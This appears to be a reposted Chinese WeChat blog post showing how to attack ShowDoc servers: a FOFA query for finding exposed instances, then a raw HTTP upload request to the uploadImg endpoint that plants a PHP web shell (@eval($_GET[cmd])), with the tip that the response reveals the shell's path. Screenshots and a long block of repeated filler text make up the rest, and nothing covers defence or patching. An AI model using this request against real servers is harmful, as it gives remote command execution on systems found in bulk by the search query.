> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oPhV-EmKZEDAxyZm4HuzUA)

fofa 语句：  

app="ShowDoc"

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QR2Apry5cLjhibpVekap8rib1X0IdoRonyooib700Ldx1vuiax1PAQYsbBKQ/640?wx_fmt=png)

我们随便点一个进去  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QRJPQa49tkKaZX0E7u5o7lU9jIoBpPFGpGrmDHVm1zA2licTw0VX5vjcA/640?wx_fmt=png)

接着我们使用 POC

```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Content-Length: 259

----------------------------921378126371623762173617
Content-Disposition: form-data; 
Content-Type: text/plain

<?php echo '123_test';@eval($_GET[cmd])?>
----------------------------921378126371623762173617--
```

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QRFXmd7c7XwPsicAVjNcB3ol0YSlwXmuxyocicW1aW0ptTWNkYzawW6bNA/640?wx_fmt=png)

response 包里有路径，直接访问就行  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QR4punwQqLSRbicibzicLlZ4Q40s7V7c2h4L77ahumm5ibLy7xBMNFx9TG3w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QRgScs5IMq5knQynvX6rsZSMAwIIJ8KSnqODt04mH9FPq9OwDMoiaib9ibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QRnRhuSoAE3Oz51Nia1tx6Kj1mJZJYHo0VEP8l3EQzL6kZT0f6oia57RTg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QRicJFcLtUXGJHGU8G3NekHomNwhODPOJMl5UcZUOibmLAsuy5Zt3RibGMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QRd5d1qrVWhKJg8UnGHjQ1UbLjMhQsmr9JsfXhWCaoiaF6N5u1GLzfcgQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv0jSV7R0yszj5PhnQFuJ2QR54H7RyL5icGWPfflsoNO5bHciaGkSJPoia3wD3WUFPx9epYh028q6XeeA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv2TUW3IicCMgLhsAW8cEUB8FKV3NktCRVJ7W14sblwk73stL4P86DViaCoG069BgrcIFVZShmW6ZbMA/640?wx_fmt=png)

凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数凑字数